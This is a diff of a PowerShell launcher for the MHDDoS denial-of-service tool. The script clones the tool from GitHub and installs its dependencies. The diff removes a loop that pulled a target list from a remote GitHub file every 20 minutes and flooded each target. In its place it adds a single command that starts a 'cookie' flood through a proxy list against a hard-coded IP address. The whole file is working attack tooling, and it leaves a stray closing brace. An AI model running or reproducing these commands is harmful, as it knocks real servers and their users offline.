@@ -16,33 +16,11 @@ Set-Location '~'
 Remove-Item 'MHDDoS' -Recurse -Force
 git clone 'https://github.com/MatrixTM/MHDDoS.git'
 Set-Location '~/MHDDoS'
+python.exe -m pip install --upgrade pip
 python -m pip install -r 'requirements.txt'
 
 $p = ' -p 1200'
 $rpc = ' --rpc 1000'
 $debug = ' --debug'
-python.exe -m pip install --upgrade pip
-# Restart attacks and update targets every 20 minutes
-while($true){
-    Stop-Process -Name "Python" -Force 
-
-    # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
-    $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
-
-    while ($targets.Length -eq 0) {
-        Write-Output 'Empty target list or some error happened. If this message repeats - contact author.' 
-        Start-Sleep(5)
-        $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
-    }
-    Write-Output $('Number of targets in list: ' + $targets.Length) 
-    
-    foreach ($target in $targets) { 
-        $runner_args = $('runner.py ' + $target.Value + $p + $rpc + $debug + ' ' + $args)
-        Write-Output $runner_args
-
-        Start-Process -FilePath 'python' -WorkingDirectory '~/MHDDoS/' -ArgumentList $runner_args -NoNewWindow
-        # Start-Job -ScriptBlock {Set-Location '~/MHDDoS/'; Write-Output $args; python runner.py $args} -ArgumentList $runner_args 
-    }
-
-    Start-Sleep(20*60) # Sleep for 20 minutes
+python start.py cookie "http://38.126.52.120:80" 0  7250  proxy411221131.txt  2236000 2236000 true
 }
